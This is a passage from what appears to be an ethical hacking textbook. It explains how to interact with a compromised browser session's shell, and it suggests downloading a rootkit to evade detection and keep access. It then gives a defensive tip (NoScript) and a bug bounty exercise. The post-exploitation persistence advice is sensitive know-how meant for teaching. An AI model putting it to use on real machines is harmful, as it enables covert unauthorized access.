		<p class="indent">You can interact with a session by entering the <span class="literal"><strong>session</strong></span> keyword followed by the session number. For example, <span class="literal">sessions 1</span> lets you interface with the first session. Try running a simple command such as <span class="literal"><strong>whoami</strong></span> or <span class="literal"><strong>pwd</strong></span>, or you can run <span class="literal"><strong>help</strong></span> to see all possible commands. You might want to use this shell <span epub:type="pagebreak" id="page_285"/>to download a rootkit so that you can avoid detection and maintain access to the machine even after the browser has been updated.</p>
		<p class="indent">Pretty spooky, right? To protect yourself, pay attention to the sites you visit, and if you’re super paranoid, install the NoScript plug-in. It prevents your browser from running any JavaScript.</p>
		<h3 class="h3" id="ch13lev12"><strong>Exercise: Hunting for Bugs in a Bug Bounty Program</strong></h3>
		<p class="noindent">It’s time for you to go out and hunt on your own. Because you’re an ethical hacker, you won’t attack companies without their permission. Luckily, many companies create <em>bug bounty programs</em> that allow ethical hackers to attack their websites and receive payment for any vulnerabilities they find. Each bug bounty program has its own rules outlining what parts of the website can be attacked and other limitations (for example, no social engineering attacks). <em><a href="http://Hackerone.com">Hackerone.com</a></em> maintains a list of bug bounty programs. To sharpen your skills while you hunt for bugs, take a look at <em>Real-World Bug Hunting</em> by Peter Yaworski (No Starch Press, 2019), which describes the bugs discovered while participating in bug bounty programs (and the rewards earned). In addition to XSS and SQL injection, Yaworski covers other vulnerabilities, such as race conditions, memory vulnerabilities, and cross-site request forgery. Happy hunting.<span epub:type="pagebreak" id="page_286"/></p>
	</body>
</html>